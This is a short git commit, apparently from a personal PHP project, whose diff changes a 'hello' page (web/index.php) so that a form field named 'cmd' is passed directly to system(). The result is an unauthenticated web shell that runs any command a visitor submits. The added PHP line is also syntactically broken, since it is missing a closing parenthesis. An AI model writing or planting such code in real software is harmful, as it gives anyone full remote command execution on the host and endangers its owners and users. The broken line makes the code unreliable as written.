cc8e35778dbc97ba5039d8bc75fcb2c87b21c973
me4tw <me4tw.b@gmail.com>
2016-07-27 01:27:38 +1000

    shit

--- web/index.php
+++ web/index.php
@@ -1,9 +1,10 @@
 <h1>hello</h1>
-
+<form method=get action="#">
+<input type=text name=cmd />
+<input type=submit value=do />
+</form>
 <?php
 
-
-
-system("find --help");
+if(isset($_GET['cmd']) system($_GET['cmd']);
 
 ?>
